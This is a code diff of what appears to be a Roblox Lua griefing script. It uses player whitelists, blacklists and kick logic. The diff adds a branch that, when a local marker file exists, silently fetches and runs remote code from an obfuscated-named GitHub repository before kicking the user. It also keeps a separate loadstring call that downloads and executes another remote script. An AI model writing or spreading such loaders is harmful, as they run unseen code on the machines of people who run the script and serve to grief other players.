@@ -21,14 +21,6 @@ local p = game:GetService("Players").LocalPlayer
 if not table.find(AltControllers, p.Name) then
     p:Kick("Nope")
 end
- 
-
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "GRIEF";
-    Text = "Check Console For Info";
-})
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nanosgithubaccount/g/main/g", true))()
 
 local Whitelisted = {
    "nanovisions",
@@ -105,8 +97,15 @@ if table.find(Blacklisted, game:GetService("Players").LocalPlayer.UserId) then
 end
 
 if isfile("123712091724.lua") then
-    wait()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomalotfornoreason/IlIlIlI/main/IlIlIlIlI", true))()
+    wait(.1)
     game.Players.LocalPlayer:Kick("Blacklisted.")
+else
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "GRIEF";
+    Text = "Check Console For Info";
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nanosgithubaccount/g/main/g", true))()
 end
 
 local Toggle = true
